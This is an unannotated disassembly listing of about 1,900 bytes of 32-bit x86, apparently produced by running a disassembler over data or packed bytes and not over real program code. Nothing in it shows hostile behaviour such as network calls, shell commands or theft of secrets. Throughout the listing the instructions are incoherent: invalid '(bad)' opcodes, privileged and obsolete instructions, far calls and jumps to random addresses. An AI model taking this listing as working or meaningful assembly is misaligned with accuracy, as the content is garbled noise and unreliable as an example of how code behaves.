  420f6a:	fcom   DWORD PTR [ebx-0x3e433840]
  420f70:	(bad)  
  420f71:	and    eax,0x79965b9e
  420f76:	dec    edi
  420f77:	add    ecx,DWORD PTR [edx]
  420f79:	cmp    BYTE PTR [eax],bh
  420f7b:	lods   eax,DWORD PTR ds:[esi]
  420f7c:	fwait
  420f7d:	es inc eax
  420f7f:	pop    esi
  420f80:	add    al,0x2f
  420f82:	xor    bh,BYTE PTR [eax-0x5f83c5b6]
  420f88:	ins    DWORD PTR es:[edi],dx
  420f89:	in     al,dx
  420f8a:	push   0x69
  420f8c:	or     BYTE PTR [esi+0x1562a128],al
  420f92:	jg     0x420f6e
  420f94:	int    0x88
  420f96:	mov    ebp,DWORD PTR [edi+0x154ebb44]
  420f9c:	and    BYTE PTR gs:0xbcd5276b,0xc4
  420fa4:	sub    al,0x17
  420fa6:	cs aaa 
  420fa8:	sbb    esp,DWORD PTR [eax]
  420faa:	xchg   DWORD PTR [edx-0x669c9872],ebx
  420fb0:	pop    esp
  420fb1:	push   edx
  420fb2:	sub    al,0xe1
  420fb4:	jne    0x420f42
  420fb6:	xor    al,BYTE PTR [ebx]
  420fb8:	int3   
  420fb9:	je     0x420f70
  420fbb:	sti    
  420fbc:	lock adc DWORD PTR [eax+0x1e87e961],esi
  420fc3:	das    
  420fc4:	sbb    DWORD PTR ds:0xf81e765e,ebx
  420fca:	std    
  420fcb:	cwde   
  420fcc:	xchg   BYTE PTR [edx-0x96cb5db],ah
  420fd2:	pop    esp
  420fd3:	and    eax,ecx
  420fd5:	xchg   esp,eax
  420fd6:	call   0xdd7c:0x52796bc3
  420fdd:	call   0xd1b:0x13280638
  420fe4:	and    BYTE PTR [ebx],0x4
  420fe7:	sbb    al,0x9a
  420fe9:	cwde   
  420fea:	cmp    BYTE PTR [edx+ebx*2+0x69546907],dl
  420ff1:	or     ebp,ecx
  420ff3:	jne    0x421045
  420ff5:	push   ds
  420ff6:	or     bl,BYTE PTR [edi-0x4e]
  420ff9:	xchg   esi,eax
  420ffa:	cwde   
  420ffb:	jp     0x421070
  420ffd:	sbb    DWORD PTR ds:0x5efa6072,esp
  421003:	pop    edi
  421004:	fwait
  421005:	or     ch,BYTE PTR [ebx]
  421007:	ret    0xda67
  42100a:	jp     0x42100f
  42100c:	cmp    DWORD PTR [ebp+0x5c],edx
  42100f:	shl    BYTE PTR [edi],1
  421011:	pusha  
  421012:	add    eax,0x741498cf
  421017:	stc    
  421018:	mov    bh,0xfd
  42101a:	pop    es
  42101b:	add    al,0xe6
  42101d:	push   es
  42101e:	addr16 pop ebp
  421020:	dec    ebp
  421021:	xchg   BYTE PTR [eax-0xb],dl
  421024:	xor    edx,DWORD PTR [eax]
  421026:	inc    edi
  421027:	loop   0x421036
  421029:	inc    esi
  42102a:	inc    ebx
  42102b:	dec    ebp
  42102c:	popa   
  42102d:	pop    edx
  42102e:	cdq    
  42102f:	repz pop ecx
  421031:	or     DWORD PTR [edi],esp
  421033:	aam    0xaf
  421035:	data16 ja 0x421089
  421038:	xchg   esi,eax
  421039:	mov    DWORD PTR [edi+0x36],esi
  42103c:	enter  0x5aae,0xcf
  421040:	adc    DWORD PTR [ebp+0x570a5756],0x32
  421047:	jecxz  0x421019
  421049:	sbb    cl,BYTE PTR [esi]
  42104b:	repnz or ah,BYTE PTR [ebp-0x7826444d]
  421052:	cmp    dl,BYTE PTR [edi-0x71a6716b]
  421058:	daa    
  421059:	lods   eax,DWORD PTR ds:[esi]
  42105a:	push   0x247bfca4
  42105f:	inc    edx
  421060:	ss addr16 pusha 
  421063:	adc    ah,BYTE PTR [eax-0x3afaa65a]
  421069:	mov    bh,0x77
  42106b:	cld    
  42106c:	or     ebp,DWORD PTR [eax+0x18222fba]
  421072:	sbb    al,BYTE PTR [esi+ebp*2]
  421075:	jbe    0x42101c
  421077:	mov    edx,0xf41d5344
  42107c:	dec    ecx
  42107d:	pop    ecx
  42107e:	sbb    ecx,edx
  421080:	xlat   BYTE PTR ds:[ebx]
  421081:	ins    BYTE PTR es:[edi],dx
  421082:	fnstcw WORD PTR [edi-0x2c569b9c]
  421088:	mov    ch,bl
  42108a:	out    dx,al
  42108b:	jnp    0x42107d
  42108d:	gs cs cdq 
  421090:	mov    eax,ds:0x5c28bf9c
  421095:	mov    ds:0xcdbf45d5,al
  42109a:	test   esi,ecx
  42109c:	sbb    eax,0xca53aee4
  4210a1:	addr16 int3 
  4210a3:	mov    edi,0x20dd775d
  4210a8:	enter  0x6f77,0xdc
  4210ac:	shl    DWORD PTR [edi],cl
  4210ae:	inc    esp
  4210af:	loope  0x42104b
  4210b1:	cmc    
  4210b2:	cmp    al,0xb2
  4210b4:	shl    DWORD PTR [edx+edi*4+0x574852c2],0xf6
  4210bc:	xor    cl,BYTE PTR [ebx-0x32]
  4210bf:	dec    ecx
  4210c0:	ins    BYTE PTR es:[edi],dx
  4210c1:	cmp    DWORD PTR [edi-0x75],ebx
  4210c4:	mov    ebp,0x654a1cc0
  4210c9:	cmp    BYTE PTR [edi+edi*1+0xd],ch
  4210cd:	inc    ecx
  4210ce:	xor    al,BYTE PTR [edx]
  4210d0:	sub    edx,DWORD PTR [esi-0x67]
  4210d3:	imul   esp,DWORD PTR [edi+0x4],0xffffffbc
  4210d7:	or     BYTE PTR [esp+edi*8-0xea3ded2],al
  4210de:	imul   ebp,esi,0xffffffb9
  4210e1:	mov    edx,0x5bb35833
  4210e6:	inc    edi
  4210e7:	ins    DWORD PTR es:[edi],dx
  4210e8:	jbe    0x421169
  4210ea:	push   ds
  4210eb:	mov    esi,0xea12236
  4210f0:	pop    esi
  4210f1:	repnz (bad) 
  4210f3:	hlt    
  4210f4:	push   es
  4210f5:	in     al,0x37
  4210f7:	dec    eax
  4210f8:	mov    ebx,0x37258c8e
  4210fd:	push   cs
  4210fe:	sahf   
  4210ff:	stos   DWORD PTR es:[edi],eax
  421100:	sub    ch,bh
  421102:	push   edx
  421103:	outs   dx,DWORD PTR ds:[esi]
  421104:	pop    edi
  421105:	(bad)  
  421106:	dec    edi
  421107:	or     BYTE PTR [edx],0xcc
  42110a:	inc    ecx
  42110b:	mov    al,0xd8
  42110d:	shl    ecx,1
  42110f:	call   0x8f29:0xf50a4e29
  421116:	test   al,0x64
  421118:	cmp    BYTE PTR [eax],ah
  42111a:	push   0xffffff81
  42111c:	sete   BYTE PTR cs:[edi]
  421120:	mov    cl,0xea
  421122:	xchg   ebp,eax
  421123:	pop    ecx
  421124:	xor    ah,bl
  421126:	lock jmp 0xfbb9e47e
  42112c:	dec    eax
  42112d:	cwde   
  42112e:	sbb    esp,ebx
  421130:	(bad)  
  421131:	stos   DWORD PTR es:[edi],eax
  421132:	aam    0xf1
  421134:	xor    esp,DWORD PTR [ebx+0x4d]
  421137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421139:	retf   
  42113a:	test   ch,dh
  42113c:	lahf   
  42113d:	push   ebp
  42113e:	iret   
  42113f:	fst    st(1)
  421141:	mov    BYTE PTR [ebp+0x3bfb8eba],al
  421147:	jne    0x4211ae
  421149:	imul   ecx,DWORD PTR [edx],0xc4e403ec
  42114f:	sub    al,al
  421151:	mov    ds:0xb7aedb95,eax
  421156:	aas    
  421157:	push   esi
  421158:	(bad)
  42115c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42115d:	push   cs
  42115e:	pop    edx
  42115f:	inc    esi
  421160:	bound  ecx,QWORD PTR [ebp-0x22]
  421163:	xchg   DWORD PTR [ecx],esp
  421165:	dec    edi
  421166:	fiadd  DWORD PTR [esp+eax*2+0x2e507c10]
  42116d:	lods   al,BYTE PTR ds:[esi]
  42116e:	fcom   DWORD PTR [ecx]
  421170:	jle    0x421110
  421172:	mov    ebx,0xf7721414
  421177:	mov    dh,0xaf
  421179:	jnp    0x421126
  42117b:	neg    esp
  42117d:	retf   0xe278
  421180:	idiv   BYTE PTR [edi-0x1a27a685]
  421186:	sbb    al,0x7e
  421188:	jp     0x4211ae
  42118a:	cmp    ebp,edx
  42118c:	repnz loopne 0x42113c
  42118f:	sbb    ecx,esp
  421191:	enter  0x96f3,0xe0
  421195:	test   BYTE PTR [edi],bh
  421197:	cmp    eax,0xc40a406b
  42119c:	pop    ebx
  42119d:	pop    esp
  42119e:	ins    BYTE PTR es:[edi],dx
  42119f:	shl    BYTE PTR fs:[ebx-0x4f4c290],0x86
  4211a7:	push   esp
  4211a8:	adc    BYTE PTR [ebp+0x239bae92],0x83
  4211af:	mov    BYTE PTR [eax+0x33],al
  4211b2:	lods   eax,DWORD PTR ds:[esi]
  4211b3:	sahf   
  4211b4:	or     BYTE PTR [ebx-0x1c00c8d5],cl
  4211ba:	xchg   BYTE PTR [ebp-0x66],ah
  4211bd:	jge    0x4211cb
  4211bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211c0:	dec    ebx
  4211c1:	stc    
  4211c2:	xor    al,0x19
  4211c4:	data16 imul BYTE PTR [esi]
  4211c7:	pop    esi
  4211c8:	imul   esp,DWORD PTR [edi+0x1c57a415],0xe5df8828
  4211d2:	dec    ecx
  4211d3:	dec    ecx
  4211d4:	std    
  4211d5:	mov    cl,0x54
  4211d7:	ss mov bh,0xfa
  4211da:	ins    BYTE PTR es:[edi],dx
  4211db:	add    cl,al
  4211dd:	add    eax,0x3d8db4d1
  4211e2:	(bad)  
  4211e3:	jno    0x4211e1
  4211e5:	outs   dx,BYTE PTR ds:[esi]
  4211e6:	repz scas al,BYTE PTR es:[edi]
  4211e8:	cmc    
  4211e9:	dec    ebp
  4211ea:	inc    esp
  4211eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211ec:	call   0xdf65:0x766543b9
  4211f3:	seto   bh
  4211f6:	and    esp,edi
  4211f8:	inc    eax
  4211f9:	sbb    edx,edi
  4211fb:	inc    ecx
  4211fc:	mov    ebx,0xc0050b0e
  421201:	adc    DWORD PTR [esi],ebp
  421203:	out    dx,eax
  421204:	xchg   ecx,eax
  421205:	mov    bh,0xc
  421207:	fstp   TBYTE PTR ds:0xd9508f7d
  42120d:	setge  ch
  421210:	daa    
  421211:	add    BYTE PTR [edi],0x2f
  421214:	xor    DWORD PTR ds:0x28e7c28a,eax
  42121a:	xchg   esp,eax
  42121b:	push   ds
  42121c:	mov    ebx,0xf325777d
  421221:	fwait
  421222:	test   eax,0x60250884
  421227:	xor    al,0x62
  421229:	xchg   esi,eax
  42122a:	fild   QWORD PTR [eax+0x7ba0189b]
  421230:	xchg   ebx,eax
  421231:	repnz fnstcw WORD PTR [ebp+0x3dcd870d]
  421238:	ror    BYTE PTR [ebp-0x2c],cl
  42123b:	shr    DWORD PTR [edx],0x2e
  42123e:	inc    esi
  42123f:	pop    ebp
  421240:	das    
  421241:	inc    ebx
  421242:	ins    BYTE PTR es:[edi],dx
  421243:	out    dx,eax
  421244:	mov    ch,0x17
  421246:	jle    0x42128d
  421248:	inc    esi
  421249:	mov    WORD PTR [eax+0x69],?
  42124c:	popa   
  42124d:	test   eax,0x65eda68a
  421252:	push   esp
  421253:	and    ecx,esp
  421255:	dec    esi
  421256:	retf   0xe529
  421259:	add    ecx,DWORD PTR [esi]
  42125b:	and    DWORD PTR [ebp+edx*8+0x79cf65e],ebx
  421262:	mov    esi,0x4c615a3e
  421267:	outs   dx,BYTE PTR ds:[esi]
  421268:	and    al,0x20
  42126a:	mov    al,0xb1
  42126c:	xchg   edi,esi
  42126e:	bound  edx,QWORD PTR [eax+eiz*4-0x70]
  421272:	mov    dh,0xac
  421274:	push   ds
  421275:	sbb    BYTE PTR [esi-0x6f6ad79],cl
  42127b:	je     0x42127b
  42127d:	fldcw  WORD PTR [esp+eax*8+0x4e078753]
  421284:	jns    0x421212
  421286:	cmp    dl,ch
  421288:	inc    ebx
  421289:	inc    ecx
  42128a:	pusha  
  42128b:	gs pushf 
  42128d:	inc    edx
  42128e:	retf   0x3118
  421291:	pop    ds
  421292:	and    al,BYTE PTR [ebx-0x214f8299]
  421298:	int    0x4f
  42129a:	fcomp  QWORD PTR [ebx+0xadea676]
  4212a0:	loopne 0x4212dd
  4212a2:	invd   
  4212a4:	mov    ds:0x659f9a83,al
  4212a9:	xchg   ebx,eax
  4212aa:	cmp    eax,0x6183cd2c
  4212af:	neg    BYTE PTR [esi-0xb]
  4212b2:	add    DWORD PTR [eax+0x76],edi
  4212b5:	xor    dl,BYTE PTR [edx+0x59]
  4212b8:	lods   al,BYTE PTR ds:[esi]
  4212b9:	jns    0x4212dc
  4212bb:	aas    
  4212bc:	sub    al,0x1d
  4212be:	or     BYTE PTR [ebx+0x5f],dh
  4212c1:	or     eax,0x3f54c2af
  4212c6:	test   BYTE PTR [ecx],ch
  4212c8:	popa   
  4212c9:	cmp    DWORD PTR [esp+ebp*2],edi
  4212cc:	aam    0x87
  4212ce:	mov    ebp,0xc2c843d0
  4212d3:	xchg   ebp,esp
  4212d5:	adc    DWORD PTR [ebx+0x1b04eac],eax
  4212db:	test   eax,esi
  4212dd:	jmp    0x46a13c1
  4212e2:	jb     0x4212b6
  4212e4:	scas   al,BYTE PTR es:[edi]
  4212e5:	cwde   
  4212e6:	push   cs
  4212e7:	xor    bh,al
  4212e9:	out    0x98,al
  4212eb:	xchg   edx,eax
  4212ec:	jbe    0x421327
  4212ee:	add    BYTE PTR [ecx-0x1b98aa55],cl
  4212f4:	push   esi
  4212f5:	loope  0x421314
  4212f7:	shl    DWORD PTR [edi-0x3919a4d7],0x1f
  4212fe:	sub    eax,0xf337cda4
  421303:	shl    eax,cl
  421305:	mov    BYTE PTR [edi+0x279680],dh
  42130b:	mov    eax,0xc1c20967
  421310:	mov    BYTE PTR [edx+0x6d368e4e],bh
  421316:	mov    ecx,0x34b74742
  42131b:	(bad)  
  42131c:	aam    0x78
  42131e:	leave  
  42131f:	(bad)  [ebx-0x7bea2f91]
  421325:	sub    DWORD PTR [ebx],esi
  421327:	or     dh,BYTE PTR [ecx]
  421329:	adc    dh,ch
  42132b:	pop    edx
  42132c:	sahf   
  42132d:	and    ebp,DWORD PTR [ecx+0x18]
  421330:	dec    ebp
  421331:	stos   DWORD PTR es:[edi],eax
  421332:	ret    
  421333:	shl    BYTE PTR [edx],1
  421335:	iret   
  421336:	ror    DWORD PTR [eax+0x6f54756d],1
  42133c:	mov    ecx,0x61043d69
  421341:	aaa    
  421342:	es dec esp
  421344:	sar    ah,cl
  421346:	xor    BYTE PTR ds:0x892ac79c,0x8c
  42134d:	mov    ch,0xd4
  42134f:	das    
  421350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421351:	jbe    0x421361
  421353:	add    eax,0xa45072af
  421358:	into   
  421359:	mov    eax,ds:0xf4b9d8f5
  42135e:	cld    
  42135f:	xchg   ebp,eax
  421360:	push   ds
  421361:	adc    al,BYTE PTR [esi+0x5c5c4b05]
  421367:	pop    edi
  421368:	xchg   esp,eax
  421369:	inc    edx
  42136a:	mov    dl,0x60
  42136c:	mov    eax,0x1f90bdd5
  421371:	pop    es
  421372:	dec    esi
  421373:	out    0x5f,eax
  421375:	clc    
  421376:	jecxz  0x421318
  421378:	pop    ecx
  421379:	and    BYTE PTR [eax+0x7d],ah
  42137c:	inc    ecx
  42137d:	inc    esp
  42137e:	das    
  42137f:	int    0x41
  421381:	mov    ebp,0xa78bdf78
  421386:	and    al,0xfe
  421388:	sbb    al,BYTE PTR [ebx-0x10]
  42138b:	clc    
  42138c:	out    dx,al
  42138d:	jae    0x42137f
  42138f:	iret   
  421390:	mov    bh,0xca
  421392:	cwde   
  421393:	(bad)  
  421394:	xor    eax,DWORD PTR [edx]
  421396:	test   al,0x6e
  421398:	mov    cl,0xaf
  42139a:	sbb    BYTE PTR [edi-0x15d9acf8],bh
  4213a0:	sub    al,0x98
  4213a2:	mov    dh,0x74
  4213a4:	mov    bl,al
  4213a6:	popf   
  4213a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a8:	mov    bh,0x8f
  4213aa:	outs   dx,BYTE PTR ds:[esi]
  4213ab:	mov    edx,0xe3e42dbd
  4213b0:	jnp    0x4213c2
  4213b2:	adc    ah,BYTE PTR [edi]
  4213b4:	inc    eax
  4213b5:	cmp    eax,0xca808002
  4213ba:	pop    esi
  4213bb:	mov    edx,0xb867c201
  4213c0:	in     al,dx
  4213c1:	add    dl,ch
  4213c3:	out    dx,al
  4213c4:	sbb    ah,cl
  4213c6:	inc    ecx
  4213c7:	mov    al,ds:0xcb3fa328
  4213cc:	jecxz  0x421354
  4213ce:	jge    0x42139d
  4213d0:	sar    bl,cl
  4213d2:	pop    ecx
  4213d3:	jb     0x42141b
  4213d5:	data16 (bad) 
  4213d7:	sti    
  4213d8:	fnstcw WORD PTR [edx+0x6]
  4213db:	sbb    eax,DWORD PTR [ecx+0x41eba04a]
  4213e1:	sahf   
  4213e2:	repz inc esp
  4213e4:	cmp    eax,DWORD PTR [ebx-0x4c9401c6]
  4213ea:	lods   eax,DWORD PTR ds:[esi]
  4213eb:	jecxz  0x42142a
  4213ed:	ins    DWORD PTR es:[edi],dx
  4213ee:	dec    edi
  4213ef:	loopne 0x421401
  4213f1:	inc    ebp
  4213f3:	or     bh,bh
  4213f5:	daa    
  4213f6:	and    DWORD PTR gs:[ebp+edi*8+0x6547b00d],ecx
  4213fe:	xchg   eax,ecx
  421400:	add    BYTE PTR [edi],bh
  421402:	fucomi st,st(5)
  421404:	test   DWORD PTR [eax],0xbdf8dcdd
  42140a:	mov    ah,0x65
  42140c:	lods   eax,DWORD PTR ds:[esi]
  42140d:	xor    BYTE PTR gs:[ecx],ch
  421410:	test   al,0xe
  421412:	sub    al,0xdb
  421414:	jge    0x421400
  421416:	inc    edx
  421417:	es xchg esp,eax
  421419:	mov    eax,0x10a2f001
  42141e:	xchg   BYTE PTR [ebp-0x431acf4c],ah
  421424:	jmp    0xcfca6771
  421429:	rcl    edi,cl
  42142b:	(bad)  
  42142d:	ins    BYTE PTR es:[edi],dx
  42142e:	stos   DWORD PTR es:[edi],eax
  42142f:	cmp    DWORD PTR [eax+ebp*1-0x6e3a8546],ecx
  421436:	call   0x4ef1:0xadac05de
  42143d:	stos   DWORD PTR es:[edi],eax
  42143e:	cmp    eax,0x8bfbc559
  421443:	int    0x58
  421445:	inc    edx
  421446:	jb     0x42147d
  421448:	mov    al,0xfe
  42144a:	lods   eax,DWORD PTR ds:[esi]
  42144b:	adc    eax,0x1e20ebc3
  421450:	in     al,dx
  421451:	adc    al,al
  421453:	cmp    eax,DWORD PTR [edi]
  421455:	lds    ebx,FWORD PTR [edi+0xa]
  421458:	adc    bl,BYTE PTR [ebx]
  42145a:	lds    edx,FWORD PTR [edi+0x43eb6806]
  421460:	test   al,0x17
  421462:	xor    al,0x4b
  421464:	cdq    
  421465:	pop    edi
  421466:	shl    BYTE PTR [edx+0x56a1a73f],1
  42146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42146d:	add    ah,BYTE PTR [ebx+0xc]
  421470:	push   es
  421471:	ror    BYTE PTR [edx+eax*8+0x12],cl
  421475:	xchg   edi,eax
  421476:	mov    al,0x2b
  421478:	jl     0x42147e
  42147a:	mov    bl,0xb8
  42147c:	rcr    bl,1
  42147e:	popa   
  42147f:	data16 and BYTE PTR [ebp+edx*8-0x23483c39],dl
  421487:	inc    esi
  421488:	jae    0x421426
  42148a:	cmp    ecx,DWORD PTR [eax+0x1c]
  42148d:	inc    eax
  42148e:	mov    DWORD PTR [esi-0x165fe2dc],edi
  421494:	enter  0x5348,0x16
  421498:	(bad)  
  421499:	jl     0x421457
  42149b:	and    BYTE PTR [edi-0x18],0xf0
  42149f:	pusha  
  4214a0:	jge    0x4214e2
  4214a2:	xchg   BYTE PTR [ecx+0x8],bl
  4214a5:	xchg   esi,eax
  4214a6:	repz xchg ebx,eax
  4214a8:	or     ch,bl
  4214aa:	mov    ds:0x502499c5,eax
  4214af:	pop    es
  4214b0:	test   BYTE PTR [ebx-0x498fdd4f],0x27
  4214b7:	ins    DWORD PTR es:[edi],dx
  4214b8:	sahf   
  4214b9:	mov    al,0x2e
  4214bb:	aas    
  4214bc:	xlat   BYTE PTR ds:[ebx]
  4214bd:	xchg   ebx,eax
  4214be:	add    al,0x6c
  4214c0:	aaa    
  4214c1:	push   ecx
  4214c2:	add    al,0xd3
  4214c4:	retf   0x33cd
  4214c7:	pop    esi
  4214c9:	jae    0x4214ab
  4214cb:	mov    ebx,0x41964af9
  4214d0:	lea    ebp,[eax+ebx*1+0x31]
  4214d4:	pusha  
  4214d5:	push   cs
  4214d6:	or     dh,BYTE PTR [edx]
  4214d8:	mov    al,ds:0x9e90afbc
  4214dd:	dec    ebp
  4214de:	fnsetpm(287 only) 
  4214e0:	mov    eax,ds:0x6f7db107
  4214e5:	mov    DWORD PTR [ebx+ebx*4-0x8],0x43e02e4b
  4214ed:	push   esi
  4214ee:	mov    bh,0x58
  4214f0:	enter  0x3572,0xa9
  4214f4:	ret    
  4214f5:	sahf   
  4214f6:	call   0x550e:0x282dd0c1
  4214fd:	sub    eax,0xfd70a88f
  421502:	hlt    
  421503:	push   esi
  421504:	ret    
  421505:	xchg   edx,eax
  421506:	mov    bh,0xc7
  421508:	jns    0x4214e4
  42150a:	or     BYTE PTR [eax-0x69c89af1],0x10
  421511:	mov    dl,0x4c
  421513:	mov    ss,WORD PTR [edx+0x70]
  421516:	loope  0x421540
  421518:	retf   
  421519:	xor    BYTE PTR [ebx-0x869ca9e],bl
  42151f:	retf   0xec4b
  421522:	mov    al,ds:0xb7a38d1b
  421527:	adc    esp,eax
  421529:	push   esp
  42152a:	mov    bl,0xeb
  42152c:	or     al,0x1a
  42152e:	dec    esi
  42152f:	adc    ebp,ebx
  421531:	popa   
  421532:	adc    dh,BYTE PTR [esi]
  421534:	rol    BYTE PTR [esi],0x25
  421537:	aaa    
  421538:	out    dx,eax
  421539:	test   eax,0xda33bc1b
  42153e:	xor    cl,bl
  421540:	aam    0xb9
  421542:	outs   dx,DWORD PTR ds:[esi]
  421543:	rcl    BYTE PTR [edi],0xf1
  421546:	adc    ecx,ecx
  421548:	jns    0x421590
  42154a:	rcr    DWORD PTR [edx+ebx*4+0x6b],0x4e
  42154f:	adc    bh,BYTE PTR [edi-0x3acf76da]
  421555:	and    eax,edx
  421557:	mov    ah,0x57
  421559:	xchg   ebp,eax
  42155a:	jns    0x42155d
  42155c:	inc    ecx
  42155d:	xchg   DWORD PTR [eax-0x14],edi
  421560:	aaa    
  421561:	mov    ebp,0xccb08dd
  421566:	mov    eax,0x7cb43fb3
  42156b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42156c:	dec    eax
  42156d:	mov    ebx,0xfcb3af5
  421572:	rcr    BYTE PTR [ebp+0x7c],0xa9
  421576:	xor    ch,bl
  421578:	neg    DWORD PTR [eax]
  42157a:	dec    eax
  42157b:	ja     0x421559
  42157d:	pop    eax
  42157e:	pop    edi
  42157f:	push   ss
  421580:	sar    BYTE PTR [ecx],0x2b
  421583:	and    eax,0xd43be959
  421588:	and    eax,ebp
  42158a:	(bad)  
  42158b:	std    
  42158c:	push   eax
  42158d:	mov    dl,0x7
  42158f:	(bad)  
  421590:	jl     0x4215b5
  421592:	leave  
  421593:	stc    
  421594:	dec    edi
  421595:	retf   0x115
  421598:	sub    BYTE PTR [ecx-0x50],al
  42159b:	push   ecx
  42159c:	stc    
  42159d:	sub    al,0x40
  42159f:	or     ebp,DWORD PTR [esi-0x3e]
  4215a2:	xor    ch,al
  4215a4:	sub    DWORD PTR [ebx+0x3df62474],esi
  4215aa:	push   edx
  4215ab:	mov    ds:0xfc1c4053,al
  4215b0:	pop    ecx
  4215b1:	aas    
  4215b2:	leave  
  4215b3:	cmp    al,0x71
  4215b5:	inc    ebp
  4215b6:	out    0xc4,eax
  4215b8:	sub    al,0x4e
  4215ba:	retf   
  4215bb:	sahf   
  4215bc:	loopne 0x4215bb
  4215be:	xor    eax,0x2c6f9c11
  4215c3:	ret    0x9c29
  4215c6:	mov    cl,0x15
  4215c8:	xor    bl,BYTE PTR [edi]
  4215ca:	xchg   DWORD PTR [ebx*8-0x7d36c1a4],ebx
  4215d1:	outs   dx,DWORD PTR ds:[esi]
  4215d2:	daa    
  4215d3:	(bad)  
  4215d4:	and    ebx,DWORD PTR es:[edx-0x1546e1e4]
  4215db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215dc:	scas   eax,DWORD PTR es:[edi]
  4215dd:	dec    esp
  4215de:	push   0xf37ed172
  4215e3:	mov    ch,0x80
  4215e5:	(bad)  
  4215e7:	inc    edi
  4215e8:	pop    es
  4215e9:	ror    BYTE PTR [edi+0x4838481e],cl
  4215ef:	scas   eax,DWORD PTR es:[edi]
  4215f0:	jb     0x421653
  4215f2:	fcom   QWORD PTR [esi-0x36f93f83]
  4215f8:	retf   
  4215f9:	mov    ah,0xe7
  4215fb:	imul   esp,DWORD PTR [ebx+0x3e91b4e],0xffffffb6
  421602:	push   edx
  421603:	sub    bh,ah
  421605:	dec    edx
  421606:	enter  0xa5c2,0x78
  42160a:	in     eax,dx
  42160b:	fst    QWORD PTR [edi-0x7a3da178]
  421611:	push   edx
  421612:	push   eax
  421613:	xchg   DWORD PTR [edi+edx*1+0x12],esp
  421617:	pop    DWORD PTR [esi-0x54f9a590]
  42161d:	aas    
  42161e:	push   ebx
  42161f:	mov    ah,0x96
  421621:	mov    al,0x9b
  421623:	repz call 0x3aae8e9
  421629:	push   ebx
  42162a:	ret    
  42162b:	inc    ebp
  42162c:	push   esi
  42162d:	inc    esp
  42162e:	leave  
  42162f:	repnz xchg edi,eax
  421631:	mov    DWORD PTR [ebx-0x5a],ebx
  421634:	ja     0x42168a
  421636:	mov    bl,0xfc
  421638:	fsubr  st(3),st
  42163a:	push   es
  42163b:	lods   eax,DWORD PTR ds:[esi]
  42163c:	pop    ebp
  42163d:	loope  0x421620
  42163f:	cs pushf 
  421641:	cmp    dh,BYTE PTR [ecx+0x1c9c2755]
  421647:	imul   ebx,DWORD PTR [esi+0x29],0xfffffff8
  42164b:	jne    0x421609
  42164d:	xchg   ah,ah
  42164f:	dec    ebp
  421650:	ja     0x421682
  421652:	fsqrt  
  421654:	sub    eax,0x3a1ca283
  421659:	xor    DWORD PTR [edi-0x1851ff53],edi
  42165f:	outs   dx,DWORD PTR ds:[esi]
  421660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421661:	jne    0x4216dd
  421663:	out    dx,eax
  421664:	lea    edi,[esi+0x63d44d76]
  42166a:	pop    es
  42166b:	in     eax,dx
  42166c:	or     DWORD PTR [edx-0x50],ebp
  42166f:	ins    BYTE PTR es:[edi],dx
  421670:	(bad)  [ebx]
  421672:	sbb    al,0xcf
  421674:	inc    esi
  421675:	pop    esi
  421676:	int3   
  421677:	fdiv   QWORD PTR [edi+0x3c]
  42167a:	stc    
  42167b:	pop    edi
  42167c:	fs lahf 
  42167e:	push   edx
  42167f:	inc    esi
  421680:	or     DWORD PTR [ecx+0x58748ddb],esp
  421686:	cmp    eax,0x8660d047
  42168b:	loope  0x421690
  42168d:	xor    al,0x47
  42168f:	rcr    DWORD PTR [esi+ebp*1-0x46],0xfe
  421694:	add    BYTE PTR [ebp+0x16],al
  421697:	cmp    BYTE PTR [esi+esi*4+0x372845db],al
  42169e:	mov    edx,0x8d026911
  4216a3:	stc    
  4216a4:	adc    al,0xd6
  4216a6:	sbb    DWORD PTR [edi-0x1ed8508],edi
  4216ac:	xchg   ebp,eax
  4216ad:	dec    ecx
  4216ae:	pop    es
  4216af:	pop    ebp
  4216b0:	cmp    eax,DWORD PTR [ebx-0xf]
  4216b3:	repnz lds ebp,FWORD PTR [ebx+0x2b608d77]
  4216ba:	mov    edi,ds
  4216bc:	sbb    eax,DWORD PTR [eax]
  4216be:	in     eax,dx
  4216bf:	arpl   WORD PTR [edi],si
  4216c1:	mov    esp,0x4af367a2
  4216c6:	xchg   edi,eax
  4216c7:	adc    edx,DWORD PTR [esi+0x63b6a112]
  4216cd:	and    al,0x72
  4216cf:	or     eax,0x22d1c906
  4216d4:	ins    DWORD PTR es:[edi],dx
  4216d5:	cmp    DWORD PTR [edi+ebp*2],ebx
  4216d8:	fmulp  st(3),st
  4216da:	mov    eax,0xe0b8c497
  4216df:	fistp  DWORD PTR [ebp+0x78]
  4216e2:	scas   al,BYTE PTR es:[edi]
  4216e3:	pop    es
  4216e4:	fidivr WORD PTR [eax-0x94798c7]
  4216ea:	sub    BYTE PTR [edx],bl
  4216ec:	mov    edx,0x3643cda1
  4216f1:	fst    QWORD PTR [ecx-0x171c1ce3]
  4216f7:	push   eax
  4216f8:	shl    DWORD PTR [edx+esi*8+0x1d],cl
  4216fc:	pop    edi
  4216fd:	mov    ebx,0xb1f90326
  421702:	ja     0x4216c6
  421704:	jne    0x4216fa
  421706:	mov    dl,0x34
  421708:	dec    edi
  421709:	sti    
  42170a:	bound  edi,QWORD PTR [ebp-0x6619633e]
  421710:	mov    dl,0x1a
  421712:	es push esi
  421714:	call   0x1a1adb02
  421719:	out    dx,eax
  42171a:	leave  
  42171b:	leave  
  42171c:	adc    BYTE PTR [edi],bh
  42171e:	lds    ecx,FWORD PTR [eax-0x71]
  421721:	cli    
  421722:	cli    
  421723:	ret    0x5efb
  421726:	pop    edi
  421727:	rcl    esi,0xae
  42172a:	ins    DWORD PTR es:[edi],dx
  42172b:	sub    DWORD PTR [ebx+eiz*2],esi
  42172e:	popa   
  42172f:	iret   
  421730:	adc    al,0x9f
  421732:	pop    eax
  421733:	in     al,dx
  421734:	pop    esp
  421735:	fwait
  421736:	jae    0x421774
